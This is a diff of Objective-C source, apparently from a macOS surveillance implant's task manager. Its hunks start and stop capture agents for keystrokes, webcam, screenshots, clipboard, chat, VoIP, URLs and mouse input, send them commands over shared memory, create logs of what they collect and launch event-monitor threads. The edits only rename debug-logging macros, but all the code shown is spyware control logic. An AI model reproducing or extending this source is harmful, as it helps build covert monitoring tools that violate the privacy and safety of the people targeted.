                     BOOL success = [_logManager createLog: AGENT_URL
                                               agentHeader: nil
@@ -1492,14 +1495,14 @@ static NSLock *gSyncLock                  = nil;
                             [anObject setObject: AGENT_RUNNING
                                                    forKey: @"status"];
                             
-#ifdef DEBUG
-                            NSLog(@"Start command sent to Agent URL");
+#ifdef DEBUG_TASK_MANAGER
+                            infoLog(@"Start command sent to Agent URL");
 #endif
                           }
                         else
                           {
-#ifdef DEBUG
-                            NSLog(@"An error occurred while starting agent URL");
+#ifdef DEBUG_TASK_MANAGER
+                            infoLog(@"An error occurred while starting agent URL");
 #endif
                           }
                       }
@@ -1515,8 +1518,8 @@ static NSLock *gSyncLock                  = nil;
                 if ([agentConfiguration isKindOfClass: [NSString class]])
                   {
                     // Hard error atm, think about default config parameters
-#ifdef DEBUG
-                    NSLog(@"Config not found");
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Config not found");
 #endif
                     break;
                   }
@@ -1543,16 +1546,16 @@ static NSLock *gSyncLock                  = nil;
                                                    offset: 0
                                             fromComponent: COMP_CORE] == TRUE)
                       {
-#ifdef DEBUG
-                        NSLog(@"Starting Agent Mouse");
+#ifdef DEBUG_TASK_MANAGER
+                        infoLog(@"Starting Agent Mouse");
 #endif
                         
                         if ([gSharedMemoryCommand writeMemory: agentCommand
                                                        offset: OFFT_MOUSE
                                                 fromComponent: COMP_CORE] == TRUE)
                           {
-#ifdef DEBUG
-                            NSLog(@"Start command sent to Agent Mouse");
+#ifdef DEBUG_TASK_MANAGER
+                            infoLog(@"Start command sent to Agent Mouse");
 #endif
                             [anObject setObject: AGENT_RUNNING
                                          forKey: @"status"];
@@ -1564,8 +1567,8 @@ static NSLock *gSyncLock                  = nil;
               }
             case AGENT_CHAT:
               {
-#ifdef DEBUG
-                NSLog(@"Starting Agent CHAT");
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Starting Agent CHAT");
 #endif
                 
                 agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
@@ -1575,8 +1578,8 @@ static NSLock *gSyncLock                  = nil;
                 shMemoryHeader->direction       = D_TO_AGENT;
                 shMemoryHeader->command         = AG_START;
                     
-#ifdef DEBUG
-                NSLog(@"Creating CHAT Agent log file");
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Creating CHAT Agent log file");
 #endif
                 BOOL success = [_logManager createLog: AGENT_CHAT
                                           agentHeader: nil
@@ -1588,8 +1591,8 @@ static NSLock *gSyncLock                  = nil;
                                                    offset: OFFT_IM
                                             fromComponent: COMP_CORE] == TRUE)
                       {
-#ifdef DEBUG
-                        NSLog(@"Start command sent to Agent CHAT");
+#ifdef DEBUG_TASK_MANAGER
+                        infoLog(@"Start command sent to Agent CHAT");
 #endif
                         [anObject setObject: AGENT_RUNNING forKey: @"status"];
                       }
@@ -1599,8 +1602,8 @@ static NSLock *gSyncLock                  = nil;
               }
             case AGENT_CLIPBOARD:
               {
-#ifdef DEBUG
-                NSLog(@"Starting Agent Clipboard");
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Starting Agent Clipboard");
 #endif
                 
                 agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
@@ -1609,8 +1612,8 @@ static NSLock *gSyncLock                  = nil;
                 shMemoryHeader->agentID         = agentID;
                 shMemoryHeader->direction       = D_TO_AGENT;
                 shMemoryHeader->command         = AG_START;
-#ifdef DEBUG
-                NSLog(@"Creating CLIPBOARD Agent log file");
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Creating CLIPBOARD Agent log file");
 #endif
                 BOOL success = [_logManager createLog: AGENT_CLIPBOARD
                                           agentHeader: nil
@@ -1618,22 +1621,22 @@ static NSLock *gSyncLock                  = nil;
                     
                 if (success == TRUE)
                   {
-#ifdef DEBUG
-                    NSLog(@"Starting Agent Clipboard");
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Starting Agent Clipboard");
 #endif
                     if ([gSharedMemoryCommand writeMemory: agentCommand
                                                    offset: OFFT_CLIPBOARD
                                             fromComponent: COMP_CORE] == TRUE)
                       {
                         [anObject setObject: AGENT_RUNNING forKey: @"status"];
-#ifdef DEBUG
-                        NSLog(@"Start command sent to Agent Clipboard");
+#ifdef DEBUG_TASK_MANAGER
+                        infoLog(@"Start command sent to Agent Clipboard");
 #endif
                       }
                     else
                       {
-#ifdef DEBUG
-                        NSLog(@"Error while sending start command to the agent");
+#ifdef DEBUG_TASK_MANAGER
+                        infoLog(@"Error while sending start command to the agent");
 #endif
                       }
                   }
@@ -1642,8 +1645,8 @@ static NSLock *gSyncLock                  = nil;
               } 
             case AGENT_VOIP:
               {
-#ifdef DEBUG
-                NSLog(@"Starting Agent Voip");
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Starting Agent Voip");
 #endif
                 
                 agentCommand        = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
@@ -1652,8 +1655,8 @@ static NSLock *gSyncLock                  = nil;
                 if ([agentConfiguration isKindOfClass: [NSString class]])
                   {
                     // Hard error atm, think about default config parameters
-#ifdef DEBUG
-                    NSLog(@"Config not found");
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Config not found");
 #endif
                     break;
                   }
@@ -1685,8 +1688,8 @@ static NSLock *gSyncLock                  = nil;
                                                        offset: OFFT_VOIP
                                                 fromComponent: COMP_CORE] == TRUE)
                           {
-#ifdef DEBUG
-                            NSLog(@"Start command sent to Agent Voip");
+#ifdef DEBUG_TASK_MANAGER
+                            infoLog(@"Start command sent to Agent Voip");
 #endif
                             [anObject setObject: AGENT_RUNNING forKey: @"status"];
                           }
@@ -1717,8 +1720,8 @@ static NSLock *gSyncLock                  = nil;
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   RCSMLogManager *_logManager  = [RCSMLogManager sharedInstance];
   
-#ifdef DEBUG
-  NSLog(@"Stop all Agents called");
+#ifdef DEBUG_TASK_MANAGER
+  infoLog(@"Stop all Agents called");
 #endif
   
   NSMutableDictionary *anObject;
@@ -1739,15 +1742,15 @@ static NSLock *gSyncLock                  = nil;
             {
             case AGENT_SCREENSHOT:
               {
-#ifdef DEBUG
-                NSLog(@"Stopping Agent Screenshot");
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Stopping Agent Screenshot");
 #endif
                 RCSMAgentScreenshot *agentScreenshot = [RCSMAgentScreenshot sharedInstance];
                 
                 if ([agentScreenshot stop] == FALSE)
                   {
-#ifdef DEBUG_ERRORS
-                    NSLog(@"Error while stopping agent Screenshot");
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Error while stopping agent Screenshot");
 #endif
                   }
                 else
@@ -1760,15 +1763,15 @@ static NSLock *gSyncLock                  = nil;
 #if 0
             case AGENT_ORGANIZER:
               {
-#ifdef DEBUG        
-                warnLog(ME, @"Stopping Agent Organizer");
+#ifdef DEBUG_TASK_MANAGER        
+                warnLog(@"Stopping Agent Organizer");
 #endif
                 RCSMAgentOrganizer *agentOrganizer = [RCSMAgentOrganizer sharedInstance];
               
                 if ([agentOrganizer stop] == FALSE)
                   {
-#ifdef DEBUG
-                    errorLog(ME, @"Error while stopping agent Organizer");
+#ifdef DEBUG_TASK_MANAGER
+                    errorLog(@"Error while stopping agent Organizer");
 #endif
                     return NO;
                   }
@@ -1777,23 +1780,23 @@ static NSLock *gSyncLock                  = nil;
                     agentConfiguration = [self getConfigForAgent: agentID];
                     [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
                   }
-#ifdef DEBUG
-                infoLog(ME, @"Organizer stopped correctly");
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Organizer stopped correctly");
 #endif
                 break;
               }
 #endif
             case AGENT_CAM:
               {
-#ifdef DEBUG
-                NSLog(@"Stopping Agent WebCam");
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Stopping Agent WebCam");
 #endif
                 RCSMAgentWebcam *agentWebcam = [RCSMAgentWebcam sharedInstance];
               
                 if ([agentWebcam stop] == FALSE)
                   {
-#ifdef DEBUG_ERRORS
-                    NSLog(@"Error while stopping agent Webcam");
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Error while stopping agent Webcam");
 #endif
                   }
                 else
@@ -1805,8 +1808,8 @@ static NSLock *gSyncLock                  = nil;
               }
             case AGENT_KEYLOG:
               {
-#ifdef DEBUG
-                NSLog(@"Stopping Agent Keylogger");
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Stopping Agent Keylogger");
 #endif
                 NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                 
@@ -1819,8 +1822,8 @@ static NSLock *gSyncLock                  = nil;
                                                offset: OFFT_KEYLOG
                                         fromComponent: COMP_CORE] == TRUE)
                   {
-#ifdef DEBUG
-                    NSLog(@"Stop command sent to Agent %x", agentID);
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Stop command sent to Agent %x", agentID);
 #endif
                     
                     [anObject setObject: AGENT_STOPPED forKey: @"status"];
@@ -1834,8 +1837,8 @@ static NSLock *gSyncLock                  = nil;
               }
             case AGENT_URL:
               {
-#ifdef DEBUG
-                NSLog(@"Stopping Agent URL");
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Stopping Agent URL");
 #endif
                 NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
               
@@ -1848,8 +1851,8 @@ static NSLock *gSyncLock                  = nil;
                                                offset: OFFT_URL
                                         fromComponent: COMP_CORE] == TRUE)
                   {
-#ifdef DEBUG
-                    NSLog(@"Stop command sent to Agent URL", agentID);
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Stop command sent to Agent URL", agentID);
 #endif
                     
                     [anObject setObject: AGENT_STOPPED forKey: @"status"];
@@ -1863,8 +1866,8 @@ static NSLock *gSyncLock                  = nil;
               }
             case AGENT_MOUSE:
               {
-#ifdef DEBUG
-                NSLog(@"Stopping Agent Mouse");
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Stopping Agent Mouse");
 #endif
               
                 NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
@@ -1878,8 +1881,8 @@ static NSLock *gSyncLock                  = nil;
                                                offset: OFFT_MOUSE
                                         fromComponent: COMP_CORE] == TRUE)
                   {
-#ifdef DEBUG
-                    NSLog(@"Stop command sent to Agent Mouse", agentID);
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Stop command sent to Agent Mouse", agentID);
 #endif
                     [anObject setObject: AGENT_STOPPED forKey: @"status"];
                   }
@@ -1890,8 +1893,8 @@ static NSLock *gSyncLock                  = nil;
               }
             case AGENT_CHAT:
               {
-#ifdef DEBUG
-                NSLog(@"Stopping Agent CHAT");
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Stopping Agent CHAT");
 #endif
               
                 NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
@@ -1905,8 +1908,8 @@ static NSLock *gSyncLock                  = nil;
                                                offset: OFFT_IM
                                         fromComponent: COMP_CORE] == TRUE)
                   {
-#ifdef DEBUG
-                    NSLog(@"Stop command sent to Agent CHAT", agentID);
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Stop command sent to Agent CHAT", agentID);
 #endif
                     [anObject setObject: AGENT_STOPPED forKey: @"status"];
                   }
@@ -1917,8 +1920,8 @@ static NSLock *gSyncLock                  = nil;
               }
             case AGENT_CLIPBOARD:
               {
-#ifdef DEBUG
-                NSLog(@"Stopping Agent Clipboard");
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Stopping Agent Clipboard");
 #endif
               
                 NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
@@ -1932,8 +1935,8 @@ static NSLock *gSyncLock                  = nil;
                                                offset: OFFT_CLIPBOARD
                                         fromComponent: COMP_CORE] == TRUE)
                   {
-#ifdef DEBUG
-                    NSLog(@"Stop command sent to Agent Clipboard", agentID);
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Stop command sent to Agent Clipboard", agentID);
 #endif
                     [anObject setObject: AGENT_STOPPED forKey: @"status"];
                   }
@@ -1944,8 +1947,8 @@ static NSLock *gSyncLock                  = nil;
               }
             case AGENT_VOIP:
               {
-#ifdef DEBUG
-                NSLog(@"Stopping Agent Voip");
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Stopping Agent Voip");
 #endif
               
                 NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
@@ -1959,8 +1962,8 @@ static NSLock *gSyncLock                  = nil;
                                                offset: OFFT_VOIP
                                         fromComponent: COMP_CORE] == TRUE)
                   {
-#ifdef DEBUG
-                    NSLog(@"Stop command sent to Agent Voip", agentID);
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Stop command sent to Agent Voip", agentID);
 #endif
                     [anObject setObject: AGENT_STOPPED forKey: @"status"];
                   }
@@ -1991,8 +1994,8 @@ static NSLock *gSyncLock                  = nil;
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
-#ifdef DEBUG
-  NSLog(@"eventsMonitor called, starting all the thread monitors");
+#ifdef DEBUG_TASK_MANAGER
+  infoLog(@"eventsMonitor called, starting all the thread monitors");
 #endif
   NSEnumerator *enumerator = [mEventsList objectEnumerator];
   id anObject;
@@ -2011,8 +2014,8 @@ static NSLock *gSyncLock                  = nil;
         {
         case EVENT_TIMER:
           {
-#ifdef DEBUG
-            NSLog(@"EVENT TIMER FOUND! Starting monitor Thread");
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"EVENT TIMER FOUND! Starting monitor Thread");
 #endif
             RCSMEvents *events = [RCSMEvents sharedEvents];
             [NSThread detachNewThreadSelector: @selector(eventTimer:)
@@ -2022,8 +2025,8 @@ static NSLock *gSyncLock                  = nil;
           }
         case EVENT_PROCESS:
           {
-#ifdef DEBUG
-            NSLog(@"EVENT Process FOUND! Starting monitor Thread");
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"EVENT Process FOUND! Starting monitor Thread");
 #endif
             RCSMEvents *events = [RCSMEvents sharedEvents];
             [NSThread detachNewThreadSelector: @selector(eventProcess:)
@@ -2033,8 +2036,8 @@ static NSLock *gSyncLock                  = nil;
           }
         case EVENT_CONNECTION:
           {
-#ifdef DEBUG
-            NSLog(@"EVENT Connection FOUND! Starting monitor Thread");
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"EVENT Connection FOUND! Starting monitor Thread");
 #endif
             RCSMEvents *events = [RCSMEvents sharedEvents];
             [NSThread detachNewThreadSelector: @selector(eventConnection:)
@@ -2044,8 +2047,8 @@ static NSLock *gSyncLock                  = nil;
           }
         case EVENT_SCREENSAVER:
           {
-#ifdef DEBUG
-            NSLog(@"EVENT Screensaver FOUND! Starting monitor Thread");
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"EVENT Screensaver FOUND! Starting monitor Thread");
 #endif
             RCSMEvents *events = [RCSMEvents sharedEvents];
             [NSThread detachNewThreadSelector: @selector(eventScreensaver:)
@@ -2058,8 +2061,8 @@ static NSLock *gSyncLock                  = nil;
         case EVENT_QUOTA:
           break;
         default:
-#ifdef DEBUG
-          NSLog(@"Event not implemented");
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Event not implemented");
 #endif
           break;
         }
@@ -2077,8 +2080,8 @@ static NSLock *gSyncLock                  = nil;
   int counter   = 0;
   int errorFlag = 0;
   
-#ifdef DEBUG
-  NSLog(@"Stop all events called");
+#ifdef DEBUG_TASK_MANAGER
+  infoLog(@"Stop all events called");
 #endif
   
   int i = 0;
@@ -2117,8 +2120,8 @@ static NSLock *gSyncLock                  = nil;
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
-#ifdef DEBUG
-  NSLog(@"Triggering action: %d", anActionID);
+#ifdef DEBUG_TASK_MANAGER
+  infoLog(@"Triggering action: %d", anActionID);
 #endif
   BOOL _isSyncing = NO;
   int waitCounter = 0;
@@ -2127,8 +2130,8 @@ static NSLock *gSyncLock                  = nil;
     
   if (configuration == nil)
     {
-#ifdef DEBUG
-      NSLog(@"Action not found");
+#ifdef DEBUG_TASK_MANAGER
+      infoLog(@"Action not found");
 #endif
       
       [outerPool release];
@@ -2147,8 +2150,8 @@ static NSLock *gSyncLock                  = nil;
         
         if (_isSyncing == YES)
           {
-#ifdef DEBUG
-            warnLog(ME, @"Sync op already in place - waiting");
+#ifdef DEBUG_TASK_MANAGER
+            warnLog(@"Sync op already in place - waiting");
 #endif
             
             while (_isSyncing == YES && waitCounter < MAX_ACTION_WAIT_TIME)
@@ -2166,8 +2169,8 @@ static NSLock *gSyncLock                  = nil;
             // We've waited way too much here
             if (waitCounter == MAX_ACTION_WAIT_TIME)
               {
-#ifdef DEBUG
-                errorLog(ME, @"Sync timed out while waiting for another in place");
+#ifdef DEBUG_TASK_MANAGER
+                errorLog(@"Sync timed out while waiting for another in place");
 #endif
                 return FALSE;
               }
@@ -2208,8 +2211,8 @@ static NSLock *gSyncLock                  = nil;
           }
         else
           {
-#ifdef DEBUG
-            errorLog(ME, @"Can't start agent with status: %d",
+#ifdef DEBUG_TASK_MANAGER
+            errorLog(@"Can't start agent with status: %d",
                      [[configuration objectForKey: @"status"] intValue]);
 #endif
           }
@@ -2229,8 +2232,8 @@ static NSLock *gSyncLock                  = nil;
           }
         else
           {
-#ifdef DEBUG
-            errorLog(ME, @"Can't stop agent with status: %d",
+#ifdef DEBUG_TASK_MANAGER
+            errorLog(@"Can't stop agent with status: %d",
                      [[configuration objectForKey: @"status"] intValue]);
 #endif
           }
@@ -2268,8 +2271,8 @@ static NSLock *gSyncLock                  = nil;
       }
     default:
       {
-#ifdef DEBUG
-        errorLog(ME, @"Unknown action type: %d", actionType);
+#ifdef DEBUG_TASK_MANAGER
+        errorLog(@"Unknown action type: %d", actionType);
 #endif
       } break;
     }
@@ -2286,8 +2289,8 @@ static NSLock *gSyncLock                  = nil;
                  type: (u_int)aType
                action: (u_int)actionID
 {
-#ifdef DEBUG_VERBOSE_1
-  NSLog(@"Registering event type %d", aType);
+#ifdef DEBUG_TASK_MANAGER
+  infoLog(@"Registering event type %d", aType);
 #endif
 
   NSMutableDictionary *eventConfiguration = [NSMutableDictionary dictionaryWithCapacity: 6];
@@ -2340,8 +2343,8 @@ static NSLock *gSyncLock                  = nil;
                   type: (u_int)actionType
                 action: (u_int)actionID
 {
-#ifdef DEBUG_VERBOSE_1
-  NSLog(@"Registering action ID (%d) with type (%d)", actionID, actionType);
+#ifdef DEBUG_TASK_MANAGER
+  infoLog(@"Registering action ID (%d) with type (%d)", actionID, actionType);
 #endif
   NSMutableDictionary *actionConfiguration = [NSMutableDictionary dictionaryWithCapacity: 6];
  
@@ -2391,8 +2394,8 @@ static NSLock *gSyncLock                  = nil;
               agentID: (u_int)agentID
                status: (u_int)status
 {
-#ifdef DEBUG_VERBOSE_1
-  NSLog(@"Registering Agent ID (%x) with status (%@) and data:\n%@", agentID, 
+#ifdef DEBUG_TASK_MANAGER
+  infoLog(@"Registering Agent ID (%x) with status (%@) and data:\n%@", agentID, 
         (status == 1 ) ? @"activated" : @"deactivated", agentData);
 #endif
   NSMutableDictionary *agentConfiguration = [NSMutableDictionary dictionaryWithCapacity: 6];
@@ -2467,15 +2470,15 @@ static NSLock *gSyncLock                  = nil;
                                   usingLock: gTaskManagerLock]
            unsignedIntValue] == anActionID)
         {
-#ifdef DEBUG
-          NSLog(@"Action %d found", anActionID);
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Action %d found", anActionID);
 #endif
           return anObject;
         }
     }
   
-#ifdef DEBUG_ERRORS
-  NSLog(@"Action not found! %d", anActionID);
+#ifdef DEBUG_TASK_MANAGER
+  infoLog(@"Action not found! %d", anActionID);
 #endif
   
   return nil;
@@ -2483,8 +2486,8 @@ static NSLock *gSyncLock                  = nil;
 
 - (NSMutableDictionary *)getConfigForAgent: (u_int)anAgentID
 {
-#ifdef DEBUG_VERBOSE_1
-  NSLog(@"getConfigForAgent called %x", anAgentID);
+#ifdef DEBUG_TASK_MANAGER
+  infoLog(@"getConfigForAgent called %x", anAgentID);
 #endif
   
   NSMutableDictionary *anObject;
@@ -2498,15 +2501,15 @@ static NSLock *gSyncLock                  = nil;
                                   usingLock: gTaskManagerLock]
            unsignedIntValue] == anAgentID)
         {
-#ifdef DEBUG_VERBOSE_1
-          infoLog(ME, @"Agent %d found", anAgentID);
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Agent %d found", anAgentID);
 #endif
           return anObject;
         }
     }
   
-#ifdef DEBUG
-  NSLog(@"Agent %d not found", anAgentID);
+#ifdef DEBUG_TASK_MANAGER
+  infoLog(@"Agent %d not found", anAgentID);
 #endif
 
   return nil;
